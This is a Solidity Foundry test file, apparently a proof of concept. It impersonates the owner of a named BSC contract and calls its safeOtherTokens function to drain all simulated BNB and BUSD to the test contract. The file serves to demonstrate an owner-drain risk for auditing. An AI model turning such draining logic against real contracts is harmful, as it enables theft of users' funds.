```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";

interface IRightContract {
    function owner() external view returns (address);
    function safeOtherTokens(address token, address payable receiv, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    IRightContract constant target = IRightContract(0x99DE5611BC1f5b8e3D8876EF567b65f94C5a2ca3);
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function setUp() public {
        vm.label(address(target), "RightContract");
        // Impersonate owner for the exploit
        address owner = target.owner();
        vm.label(owner, "Owner");
        vm.startPrank(owner);
    }

    function testExploitOwnerDrainBNB() public {
        // Deal some BNB to the contract
        uint256 drainAmount = 100 ether;
        deal(address(target), drainAmount);

        uint256 receiverBalanceBefore = address(this).balance;
        // Drain BNB to an arbitrary recipient (the test contract itself)
        target.safeOtherTokens(address(0), payable(address(this)), drainAmount);
        uint256 receiverBalanceAfter = address(this).balance;

        assertEq(receiverBalanceAfter - receiverBalanceBefore, drainAmount, "BNB transfer failed");
        assertEq(address(target).balance, 0, "Contract BNB not drained");
    }

    function testExploitOwnerDrainBUSD() public {
        // Deal some BUSD to the contract
        uint256 drainAmount = 1000 * 1e18;
        deal(BUSD, address(target), drainAmount);

        uint256 receiverBalanceBefore = IERC20(BUSD).balanceOf(address(this));
        // Drain BUSD to the test contract
        target.safeOtherTokens(BUSD, payable(address(this)), drainAmount);
        uint256 receiverBalanceAfter = IERC20(BUSD).balanceOf(address(this));

        assertEq(receiverBalanceAfter - receiverBalanceBefore, drainAmount, "BUSD transfer failed");
        assertEq(IERC20(BUSD).balanceOf(address(target)), 0, "Contract BUSD not drained");
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}
```
